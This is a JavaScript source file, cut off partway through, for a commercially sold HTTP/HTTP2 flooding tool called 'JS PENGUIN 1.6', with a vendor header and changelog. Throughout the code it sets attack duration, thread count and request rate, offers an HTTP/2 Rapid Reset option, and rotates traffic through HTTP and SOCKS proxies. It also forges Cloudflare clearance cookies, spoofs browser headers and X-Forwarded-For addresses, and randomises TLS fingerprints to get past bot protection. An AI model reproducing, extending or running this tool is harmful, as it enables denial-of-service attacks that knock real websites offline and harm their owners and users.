/*
    JS PENGUIN 1.6

    Node: v22.9.0
    OS: Ubuntu 22.08
    Setup: npm install hpack https commander colors

    ATLAS corporation (t.me/atlasapi)
    Developer: Benshii (t.me/benshii)
    Date: 15 January, 2025

    ———————————————————————————————————————————

    Released by ATLAS API corporation (atlasapi.co)

    Thank you for purchasing this script.

    1.1 CHANGELOG:
    - Added redirect handler
    - Added cookie parser
    - Fixed update headers
    - Added proxy conn stats
    - Removed UAM option
    
    1.2 CHANGELOG:
    - Added config loading

    1.3 CHANGELOG:
    - Fixed randpath
    - Socks4/5 support
    - Optimised code
    - Updated randrate

    1.4 CHANGELOG:
    - Faster requests
    - New proxy class
    - Extra headers
    - New ratelimit handler
    - Randomised tls settings
    - Improved Fingerprints
    - HTTP2 request queue

    1.5 CHANGELOG:
    - Added slowmo option
    - 

    1.6 CHANGELOG:
    - Proxy protocol detection
    - Added cookie options

    COMING SOON
*/

const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const colors = require('colors');
const { Command } = require('commander');
const socks = require('socks').SocksClient;

process.setMaxListeners(0);

process.on('uncaughtException', function (e) {
    // console.log(e)
});
process.on('unhandledRejection', function (e) {
    // console.log(e)
});

const options = new Command();
options
    .option('-m, --method <method>', 'Request method <GET/POST/...>')
    .option('-u, --target <url>', 'Target URL <http/https>')
    .option('-s, --time <seconds>', 'Duration of attack <seconds>', 120) 
    .option('-t, --threads <number>', 'Number of threads <int>', 4)
    .option('-r, --rate <rate>', 'Requests per second <int>', 60)

    .option('-p, --proxy <proxy>', 'Proxy file <path>')
    .option('-T, --type <proxytype>', 'Proxy type <http/socks4/socks5>', 'http')
    .option('-d, --debug <true/false>', 'Debug mode', true)

    .option('-v, --http <1/2>', 'HTTP version', 2)
    .option('--full <true/false>', 'Full HTTP headers', false)
    .option('--extra <true/false>', 'Extra HTTP headers', false)
    .option('--delay <10/1000>', 'Delay between requests', 10)
    .option('-D, --data <string/RAND>', 'Request data')
    .option('--cache <true/false>', 'Disable cache header', false)
    .option('--close <true/false>', 'Close broken proxies', false)
    .option('--conns <1/1000>', 'Connection limit')
    .option('--reset <true/false>', 'Rapidreset exploit', false)

    .option('-q, --query <true/false>', 'Generate random query', false)
    .option('--randrate <1-128/60>', 'Random request rate', "")
    .option('--randpath <true/false>', 'Random URL path', false)
    .option('--ratelimit <true/false>', 'Ratelimit mode', false)
    .option('--slowmo <true/false>', 'Slow request rate', false)

    .option('-I, --ip <IPv4>', 'IPv4 address')
    .option('-U, --ua <string>', 'User-agent header')
    .option('-C, --cookie <string/RAND>', 'Cookie header (string/CLOUDFLARE/RANDOM)')

    .option('-F, --fingerprint <true/false>', 'TLS fingerprint', false)
    .option('-R, --referer <url/RAND>', 'Referer URL header')
    .option('--test <true/false>', 'Debug data frame', false)

    .option('--checker <true/false>', 'Proxy checker', false)
    .option('--proxyapi <url>', 'Fetch proxies from proxy API')

    .option('--config <file>', 'Load configuration <file.json>')

    .parse(process.argv);

    if (options.opts().config && typeof options.opts().config === 'string') {
        try {
            const config_options = fs.readFileSync(options.config, 'utf8');
            const config = JSON.parse(config_options);
            Object.keys(config).forEach(key => {
                if (options[key] !== null && config[key] !== null && config[key] !== false && config[key] !== options.opts()[config[key]]) {
                    options[key] = config[key];
                }
            });
        } catch (error) {
            console.error(`Error loading config: ${error.message}`);
            process.exit(0)
        }
    }


    
const opts = options.opts();

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

if (!options.opts().method || !options.opts().target || !options.opts().proxy && !options.opts().ip) {
    options.help();
    process.exit(1);
}

// const opts = options.opts();
var reqmethod = opts.method || "GET";
const target = opts.target;
const time = opts.time || 120;
const threads = opts.threads;
const ratelimit = opts.rate || 60;
const proxyfile = opts.proxy;
const proxytype = opts.type;
const debug = opts.debug || false;

const http_opt = parseInt(opts.http) || 2;
const full_headers = opts.full || false;
const extra_headers = opts.extra || false;
const delay_opt = opts.delay || 10;
const data_opt = opts.data || undefined;
const cache_opt = opts.cache;
const close_opt = opts.close || false;
const rapidreset = opts.reset || false;

const query_opt = opts.query || false;
const randrate = opts.randrate || "";
const randpath = opts.randpath || false;
const ratelimit_opt = opts.ratelimit;

const fingerprint_opt = opts.fingerprint || true;
const referer_opt = opts.referer || false;

const ip_opt = opts.ip || undefined;
const ua_opt = opts.ua || undefined;
const checker = opts.checker || false;
const proxyapi = opts.proxyapi || undefined;
const connections = opts.conns;
const slowmo = opts.slowmo || false;
const test = opts.test || false;
var cookie_opt = opts.cookie || undefined;
var cookie_mode = "";

const status_queue = []
let status_codes = {}

const url = new URL(target);
const protocol = url.protocol.replace(":", "");
const port = url.port || (url.protocol === 'https:' ? 443 : 80);

const request_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'RAND']

const SettingHeaderTableSize = 0x1;
const SettingEnablePush = 0x2;
const SettingInitialWindowSize = 0x4;
const SettingMaxHeaderListSize = 0x6;

if (!proxyfile && !ip_opt) {
    console.error("Proxy file is missing!");
    process.exit(1);
}

let proxies;

if (proxyfile) {
    proxies = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
}

if (proxyapi) {
    try {
        const proxyurl = new URL(proxyapi);
        // console.log(proxyurl)
        const proxy_proto = proxyurl.protocol.replace(':', '');
        // console.log(proxy_proto);
        https.request({
            hostname: proxyurl.hostname,
            port: proxy_proto === 'https' ? 443 : 80,
            method: 'GET',
            path: proxyurl.pathname + proxyurl.search
        }, (res) => {
            if (res.statusCode !== 200) {
                console.log(`[${colors.bold.magenta('JS/PENGUIN')}] | ${colors.bold('Proxy API')}: [${colors.underline(proxyurl.hostname)}], ${colors.bold('Error')}: [${colors.underline('Invalid response: Status Code' + res.statusCode)}]`);
                process.exit(0);
            }
            let body = '';
            res.on('data', (data) => body += data);
            res.on('end', () => {
                proxies = body.replace(/\r/g, '').split('\n').filter(proxy => proxy.trim() !== '');
                // console.log(`[${colors.bold.magenta('JS/PENGUIN')}] | ${colors.bold('Proxy API')}: [${colors.underline(proxyurl.hostname)}], ${colors.bold('Proxies Found')}: [${colors.underline(proxies.length)}]`);
            })
        }).on('error', (e) => {
            // console.log(`[${colors.bold.magenta('JS/PENGUIN')}] | ${colors.bold('Proxy API')}: [${colors.underline(proxyurl.hostname)}], ${colors.bold('Error')}: [${colors.underline(e.message)}]`);
        }).end();
    } catch (err) {
        // console.log(`[${colors.bold.magenta('JS/PENGUIN')}] | ${colors.bold('Proxy API')}: [${colors.underline(proxyurl.hostname)}], ${colors.bold('Error')}: [${colors.underline('Proxy URL error:' + err.message)}]`);
    }
}


if (!request_methods.includes(reqmethod)) {
    console.error('Invalid request method!');
    process.exit(1);
}

if (!['http', 'https', 'socks4', 'socks5'].includes(proxytype)) {
    console.error('Invalid proxytype! (http/https/socks4/socks5)');
    process.exit(1);
}

function random_string(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function random_char(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function random_int(minimum, maximum) {
    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
}

function random_cookies() {
    let cookies = "";
    const cookie_names = ["JSESSIONID", "_ga", "PHPSESSID", `_ga_${random_string(random_int(10, 11)).toUpperCase()}`];
        
    const cookie_limit = random_int(1, cookie_names.length);
    for (var x = 0; x < cookie_limit; x++) {
        const cookie_name = cookie_names[Math.floor(Math.random() * cookie_names.length)];
        const cookie_index = cookie_names.indexOf(cookie_name);
        if (cookie_index > -1) {
            cookie_names.splice(cookie_index, 1);
        }
        const cookie_value = random_string(random_int(random_int(16, 32), random_int(32, 64)));
        cookies += `${cookie_name}=${cookie_value}`;
        if (x+1 < cookie_limit) {
            cookies += '; ';
        }
    }

    return cookies
}

const format_date = () => {
    const now = new Date();
    const days = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"];
    const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];

    const day_name = days[now.getUTCDay()];
    const day = String(now.getUTCDate()).padStart(2, '0');
    const month = months[now.getUTCMonth()];
    const year = String(now.getUTCFullYear()).slice(-2);
    const time = now.toISOString().split("T")[1].split(".")[0];

    return `${day_name}, ${day}-${month}-${year} ${time} GMT`;
};

const priorities = ["MEDIUM", "HIGH"];

function cloudflare_cookies(pathname) {
    const timestamp = Math.floor(Date.now() / 1000)
    const cookies = [];
    const extra_parts = [
        `Path=${pathname}`,
        `Expires=${format_date()}`,
        `Domain=.${url.hostname}`,
        `Priority=${priorities[~~Math.floor(Math.random() * priorities.length)]}`,
        `HttpOnly`,
        `Secure`,
        `SameSite=None`,
        'Partitioned'
    ];
    // console.log(extra_parts)

    const extra = Math.random() < 0.50 ? extra_parts.splice(0, random_int(extra_parts.length - 2, extra_parts.length - 1)).join('; ') : extra_parts.join('; ');
    // console.log(`extra: [${extra}]\n`);
    // s.ZHBJo_3wGNwhZmtxVyZBgNq6v4IC6vLfkOnR78Rhc-1678639827-0-ATKGlsFBMrDubyu0vPBqM2Rg7KYz/EmpbCb8YxSuwwZakke2dDjRap74BUxujLtcwx+vM7GdpyCBEClecuWABOQcLug0XKWzGZwDatdn8+dG15IC0tRiB0Dq4qVT3Ure0zkrtD5DXFz7kpyBuVcpxs18jfgG+zZ8XSqkJj4pXYEkv1OG5MToHSGilvJHsBsbSA==
    if (Math.random() < 0.75) {
        const CF_BFM = `__cf_bm=${random_char(43)}-${timestamp}-0-${random_char(28)}/${random_char(37)}+${random_char(38)}+${random_char(50)}+${random_char(37)}${'='*random_int(1, 2)}`;
        cookies.push(CF_BFM);
    }

    const CF_CLR = `cf_clearance=${random_char(15)}_${random_char(43)}-${timestamp}-1.2.1.1-${random_char(35)}.${random_char(205)}.${random_char(51)}.${random_char(30)}.${random_char(17)}`;
    cookies.push(CF_CLR);
    cookies.push(extra);

    return cookies.join('; ').slice(cookies.length-1, cookies.length);
}

function random_ip() {
    return `${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}`;
}

const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_CBC_SHA",
    "TLS_RSA_WITH_AES_256_CBC_SHA"
]

const curves = [
    "X25519",
    "P-256",
    "P-384"
]

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
]

const versions = [
    "TLSv1.3",
    "TLSv1.2",
    "TLSv1.1",
]

const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
];

const encodings = [
    "gzip, deflate, br, zstd",
    "gzip, deflate, br"
]

const profiles = [
    {
        "user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="131", "Google Chrome";v="131"',
        "sec-ch-ua-platform": '"Windows"'
    },
    {
        "user-agent": 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
        "sec-ch-ua": '"Google Chrome";v="91", "Chromium";v="91", "Not.A/Brand";v="8"',
        "sec-ch-ua-platform": '"macOS"'
    },
    {
        "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
        "sec-ch-ua": '"Google Chrome";v="90", "Chromium";v="90", "Not.A/Brand";v="8"',
        "sec-ch-ua-platform": '"Linux"'
    },
    {
        "user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
        "sec-ch-ua": '"Not.A/Brand";v="99", "Chromium";v="92", "Google Chrome";v="92"',
        "sec-ch-ua-platform": '"Windows"'
    }
];

const ssl_versions = ['771', '772', '773']; 
const cipher_suites = ['4865', '4866', '4867', '49195', '49195', '49199', '49196', '49200', '52393', '52392', '49171', '49172', '156', '157', '47', '53'];
const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];
const elliptic_curves = ['4588', '29', '23', '24'];

class Proxy {
    constructor(host, port, type) {
      this.host = host;
      this.port = parseInt(port);
      this.type = type;
      this.socket = null;
    }
  
    connect(options = {}) {
      return new Promise((resolve, reject) => {
        if (this.type === 'SOCKS4' || this.type === 'SOCKS5') {
          this.socks(url.hostname, port, options)
            .then(resolve)
            .catch(reject);
        } else if (this.type === 'HTTP' || this.type === 'HTTPS') {
        this.http(options)
          .then(resolve)
          .catch(reject);
        } else {
          reject(new Error('Invalid proxy type'));
        }
      });
    }
  
    socks(options) {
        return new Promise((resolve, reject) => {
            socks.createConnection({
                proxy: {
                    host: this.host,
                    port: this.port,
                    type: this.type === 'SOCKS5' ? 5 : 4,
                    ...(options.username && options.password && { userId: options.username, password: options.password }),
                },
                command: 'connect',
                destination: { host: url.hostname, port: port },
                timeout: options.timeout || 10000,
            }, (error, info) => {
                if (error) {
                    return reject(new Error(`SOCKS connection error: ${error.message}`));
                }
                this.socket = info.socket;
                resolve(info.socket);
            });
        });
    }
  
    http(options) {
        // console.log(options)
        return new Promise((resolve, reject) => {
            const socket = net.connect({host: this.host, port: this.port}, () => {
                let request_header;
                if (options.username && options.password) {
                    const authString = Buffer.from(`${options.username}:${options.password}`).toString('base64');
                    request_header = `CONNECT ${url.hostname}:${port} HTTP/1.1\r\nHost: ${url.hostname}:${port}\r\nProxy-Authorization: Basic ${authString}\r\nConnection: Keep-Alive\r\n\r\n`
                } else {
                    request_header = `CONNECT ${url.hostname}:${port} HTTP/1.1\r\nHost: ${url.hostname}:${port}\r\nConnection: Keep-Alive\r\n\r\n`
                }
                // console.log('request_header:', request_header);
                // const request_header = `CONNECT ${url.hostname}:${port} HTTP/1.1\r\nHost: ${url.hostname}:${port}\r\nConnection: Keep-Alive\r\n`;
                // const auth_header = options.username && options.password
                //     ? `Proxy-Authorization: Basic ${Buffer.from(`${options.username}:${options.password}`).toString('base64')}\r\n`
                //     : '';
                // console.log(`${request_header}${auth_header}`)
                socket.write(request_header);
            });
  
            socket.on('data', (data) => {
            const response = data.toString('utf8');
            // console.log(response);
            if (response.includes('HTTP/1.1 OK') || response.includes('HTTP/1.0 OK') || response.toLocaleLowerCase().includes('connection established')) {
                this.socket = socket;
                resolve(socket);
            } else {
                socket.destroy();
                reject(new Error(`Bad proxy response: ${response}`));
            }
            });
    
            socket.on('timeout', () => {
                socket.destroy();
                reject(new Error('Connection timeout'));
            });
    
            socket.on('error', (err) => {
                socket.destroy();
                reject(new Error(`Connection error: ${err.message}`));
            });
    
            socket.setTimeout(options.timeout || 10000);
            // socket.setKeepAlive(true, 60000);
            // socket.setMaxListeners(10 * 10 * 60);
        });
    }

    close() {
        if (this.socket) {
            // console.log(`socket: ${this.socket}, dead ? ${this.socket.destroyed}`);
            this.socket.destroy();
            this.socket.removeAllListeners();
            // console.log(`killed: socket: ${this.socket}, dead ? ${this.socket.destroyed}`);
        }
    }
}

class Http2 {
    constructor(proxy) {
        this.id = 1;
        this.data = Buffer.alloc(0);
        this.hpack = new HPACK();
        // this.hpack.setTableSize(4096);
        this.frames = [];
        this.proxy = proxy;
    }

    static builder() {
        return new Http2();
    }

    encode_frame(streamId, type, payload = "", flags = 0) {
        this.id = streamId;
        let frame = Buffer.alloc(9)
        frame.writeUInt32BE(payload.length << 8 | type, 0)
        frame.writeUInt8(flags, 4)
        frame.writeUInt32BE(streamId, 5)
        if (payload.length > 0)
            frame = Buffer.concat([frame, payload])
        return frame
    }

    decode_frame(data) {
        const length_type = data.readUInt32BE(0)
        const length = length_type >> 8
        const type = length_type & 0xFF
        const flags = data.readUint8(4)
        const streamID = data.readUInt32BE(5)
        const offset = flags & 0x20 ? 5 : 0
    
        let payload = Buffer.alloc(0)
    
        if (length > 0) {
            payload = data.subarray(9 + offset, 9 + offset + length)
    
            if (payload.length + offset != length) {
                return null
            }
        }
    
        return {
            streamID,
            length,
            type,
            flags,
            payload
        }
    }

    encode_settings(settings) {
        const data = Buffer.alloc(6 * settings.length)
        for (let i = 0; i < settings.length; i++) {
            data.writeUInt16BE(settings[i][0], i * 6)
            data.writeUInt32BE(settings[i][1], i * 6 + 2)
        }
        return data
    }

    encode_rst_stream(streamId, type, flags) {
        const frame_header = Buffer.alloc(9);
        frame_header.writeUInt32BE(4, 0);
        frame_header.writeUInt8(type, 4);
        frame_header.writeUInt8(flags, 5);
        frame_header.writeUInt32BE(streamId, 5);
        const status_code = Buffer.alloc(4).fill(0);
        return Buffer.concat([frame_header, status_code]);
    }
}

class Request {
    constructor(path) {
        this.path = path
        this.headers = [];
        this.mode = cookie_mode;
        this.timestamp = Date.now().toString().substring(0, 10);
    }

    static builder() {
        return new Request();
    }

    set_path(path) {
        this.path = path
    }

    add_header(header, value) {
        const index = this.headers.findIndex(([key]) => key === header);
        if (index !== -1) {
            this.headers[index][1] = value;
        } else {
            this.headers.push([header, value]);
        }
        return this;
    }

    find_header(name) {
        const header = this.headers.find(([k, _]) => k === name);
        return header ? header[1] : null;
    }

    replace_header(k1, v1) {
        const index = this.headers.findIndex(([k, _]) => k === k1);
        if (index !== -1) {
            this.headers[index][1] = v1;
        }
        return this;
    }

    add_headers(headers) {
        for (const [key, value] of Object.entries(headers)) {
            if (value !== null && value !== undefined) {
                this.headers.push([key, value]);
            }
        }
        return this;
    }

    generate_headers() {
        this.headers = [];

        const version = random_int(126, 131);
        const browsers = ["Google Chrome", "Brave"];

        const profile = profiles[~~Math.floor(Math.random() * profiles.length)];
        const browser = browsers[~~Math.random(Math.floor() * browsers.length)];
        var sec_ch_ua, sec_ch_ua_full_version_list, sec_ch_ua_full_version;
        switch (version) {
            case 126:
                sec_ch_ua = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
                sec_ch_ua_full_version = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                sec_ch_ua_full_version_list = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
                break;
            case 127:
                sec_ch_ua = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
                sec_ch_ua_full_version = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                sec_ch_ua_full_version_list = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
                break;
            case 128:
                sec_ch_ua = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
                sec_ch_ua_full_version = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                sec_ch_ua_full_version_list = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
                break;
            case 129:
                sec_ch_ua = `\"${browser}\";v=\"${version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${version}\"`;
                sec_ch_ua_full_version = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                sec_ch_ua_full_version_list = `\"${browser}\";v=\"${sec_ch_ua_full_version}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\"`;
                break;
            case 130:
                sec_ch_ua = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
                sec_ch_ua_full_version = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                sec_ch_ua_full_version_list = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
                break;
            case 131:
                sec_ch_ua = `\"${browser}\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not_A Brand\";v=\"24\"`;
                sec_ch_ua_full_version = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                sec_ch_ua_full_version_list = `\"${browser}\";v=\"${sec_ch_ua_full_version}\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"Not_A Brand\";v=\"24.0.0.0\"`;
            default:
                sec_ch_ua = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
                sec_ch_ua_full_version = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                sec_ch_ua_full_version_list = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
                break;
        }

        const platforms = [
            "Windows NT 10.0; Win64; x64",
            // "Macintosh; Intel Mac OS X 10_15_7",
            // "X11; Linux x86_64",
        ];

        const platform = platforms[Math.floor(Math.random() * platforms.length)];

        var sec_ch_ua_platform, sec_ch_ua_arch, platform_version;
        switch (platform) {
            case "Windows NT 10.0; Win64; x64":
                sec_ch_ua_platform = "\"Windows\"";
                sec_ch_ua_arch = "x86";
                platform_version = "\"10.0.0\"";
                break;
            default:
                sec_ch_ua_platform = "\"Windows\"";
                sec_ch_ua_arch = "x86";
                platform_version = "\"10.0.0\"";
                break;
        }

        var user_agent = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;

        if (ua_opt) {
            user_agent = ua_opt;
        }

        var referer;
        if (referer_opt) {
            const extensions = ['com', 'net', 'org', 'io', 'co', 'gov'];
            const extension = extensions[Math.random(Math.floor() * extensions.length)];
            try {
                if (referer_opt === "RAND") {
                    referer = `https://${random_string(random_int(6, 9))}.${extension}/`;
                } else {
                    const referer_url = new URL(referer_opt);
                    referer = referer_url.href;
                }
            } catch (err) {
                referer = url.href;
            }
        }

        var pathname = this.path;
        if (pathname === "" && !query_opt) {
            pathname = "/"
        }

        if (pathname.includes('%RAND%')) pathname = pathname.replace("%RAND%", random_string(random_int(6, 9)));

        // console.log(`pathname: ${pathname}`);

        if (randpath) {
            const pathname_length = pathname.length;
            if (pathname[pathname_length-1] !== "/") {
                pathname = `${pathname}/${random_string(random_int(6, 9))}`;
            } else {
                pathname = `${pathname}${random_string(random_int(6, 9))}`;
            }
        }

        if (query_opt) pathname = pathname + '?' + random_string(random_int(6, 9));

        // console.log(`final_pathname: ${pathname}`);
        let request_method = reqmethod;
        if (reqmethod === "RAND") request_method = request_methods[~~Math.floor(Math.random() * request_methods.length)]

        let content_length = 0;
        if (data_opt !== undefined) {
            content_length = Buffer.from(data_opt, 'utf-8').length;
        } else if (data_opt === "RAND") {
            content_length = Buffer.from(random_string(random_int(10, 100)), 'utf-8').length;
        }

        // console.log(`cookie opt: [${cookie_opt}]`);

        if (cookie_opt === 'RAND') {
            this.mode = 'RAND';
        } else if (cookie_opt === 'CLOUDFLARE') {
            this.mode = 'CLOUDFLARE';
        }

        if (this.mode === 'RAND') {
            cookie_opt = random_cookies();
        } else if (this.mode === 'CLOUDFLARE') {
            cookie_opt = cloudflare_cookies(this.path);
        }

        // console.log(`cookie_opt: \n\n${cookie_opt}\n\n`);

        const cache_header = cache_opt ? "no-cache" : "max-age=0";

        const headers = Object.entries({
            ":method": request_method,
            ":authority": url.hostname,
            ":scheme": "https",
            ":path": pathname
        }).concat(Object.entries({
            ...(extra_headers && Math.random() < 0.50 && { "cache-control": cache_header } ),
            ...(request_method === "POST" && { "content-length": content_length }),
            ...(request_method === "POST" && { "content-type": "application/x-www-form-urlencoded" }),
            // "sec-ch-ua": sec_ch_ua,//brand_value,//'"Not.A/Brand";v="8", "Chromium";v="128", "Google Chrome";v="128"',//brand_value,
            "sec-ch-ua": ua_opt ? sec_ch_ua : profile["sec-ch-ua"],
            ...(full_headers && { "sec-ch-ua-arch": sec_ch_ua_arch }),
            ...(full_headers && { "sec-ch-ua-bitness": "\"64\"" }),
            ...(full_headers && { "sec-ch-ua-full-version": sec_ch_ua_full_version }),
            ...(full_headers && { "sec-ch-ua-full-version-list": sec_ch_ua_full_version_list }),
            "sec-ch-ua-mobile": "?0",
            ...(full_headers && { "sec-ch-ua-model": "\"\"" }),
            "sec-ch-ua-platform": ua_opt ? sec_ch_ua_platform : profile["sec-ch-ua-platform"],
            ...(full_headers && { "sec-ch-ua-platform-version": platform_version }),
            "upgrade-insecure-requests": "1",
            "user-agent": ua_opt ? user_agent : profile['user-agent'],
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            ...(Math.random() < 0.36 && extra_headers && { "sec-purpose": "prefetch;prerender" }),
            ...(Math.random() < 0.36 && extra_headers && { "purpose": "prefetch" }),
            // ...(browser ? 'Brave' && { "sec-gpc": "1" } : {}),
            "sec-gpc": "1",
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "accept-encoding": encodings[~~Math.random(Math.floor() * encodings.length)], //"gzip, deflate, br, zstd",
            "accept-language": languages[~~Math.random(Math.floor() * languages.length)],
            ...(Math.random() < 0.38 && extra_headers && { "if-modified-since": this.timestamp }),
            ...(Math.random() < 0.37 && extra_headers && { "dnt": "1" }),
            ...(full_headers && { "x-forwarded-for": Math.random() < 0.36 ? `${random_ip()}, ${this.proxy}` : this.proxy }),
            ...(full_headers && { "x-forwarded-proto": protocol }),
            ...(full_headers && { "x-forwarded-scheme": protocol }),
            ...(full_headers && { "x-real-ip": this.proxy }),
            "priority": 'u=0, i',
            ...(referer && { "referer": referer}),
            ...(cookie_opt && { "cookie": cookie_opt }),
            // ...(uam_opt) && { "x-forwarded-proto": "https"},
            // ...(uam_opt) && { "x-forwarded-for": `${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}`}
        })).filter(a => a[1] != null);
        
        // console.log(headers);

        this.add_headers(Object.fromEntries(headers));
        this.order_headers()
        return this;
    }

    update_headers() {
        if (this.path !== undefined && this.path !== url.pathname) {
            this.replace_header(":path", this.path);
        }
        this.order_headers();
        return this;
    }

    remove_header(header) {
        const index = this.headers.findIndex(([header_index, _]) => header_index === header);
        if (index > -1) {
            this.headers.splice(index, 1);
        }
        return this;
    }

    order_headers() {
        const order = [
            ":method",
            ":authority",
            ":scheme",
            ":path",
            "cache-control",
            "content-length",
            "content-type",
            "sec-ch-ua",
            "sec-ch-ua-arch",
            "sec-ch-ua-bitness",
            "sec-ch-ua-full-version",
            "sec-ch-ua-full-version-list",
            "sec-ch-ua-mobile",
            "sec-ch-ua-model",
            "sec-ch-ua-platform",
            "sec-ch-ua-platform-version",
            "upgrade-insecure-requests",
            "user-agent",
            "accept",
            "sec-gpc",
            "accept-language",
            "accept-encoding",
            // "sec-purpose",
            // "purpose",
            // "accept",
            "sec-fetch-site",
            "sec-fetch-mode",
            "sec-fetch-user",
            "sec-fetch-dest",
            "if-modified-since",
            "dnt",
            // "accept-language",
            "priority",
            "referer",
            "cookie",
            "x-forwarded-for",
            "x-forwarded-proto",
            "x-forwarded-scheme"
        ];

        const order_map = new Map(order.map((header, value) => [header, value]));

        this.headers.sort(([header], [index]) => {
            const index1 = order_map.get(header);
            const index2 = order_map.get(index);
            return (index1 !== undefined ? index1 : Infinity) - (index2 !== undefined ? index2 : Infinity);
        });
    }

    build_str() {
        this.remove_header("priority");
        this.add_header("Host", url.hostname);
        let request_str = `GET ${this.path} HTTP/1.1\r\n`;

        for (const [k, v] of this.headers) {
            if (!k.startsWith(":")) {
                request_str += `${k}: ${v}\r\n`;
            }
        }

        request_str += 'Connection: keep-alive\r\n\r\n';
        return request_str;
    }
}

function rate_range(base) {
    const rate_eq = (base * 50) / 100;
    const min_range = base - rate_eq;
    const max_range = base + rate_eq;

    return {
        min: Math.max(0, min_range),
        max_range
    };
}

function random_fingerprint() {
    const version = ssl_versions[random_int(0, ssl_versions.length - 1)];
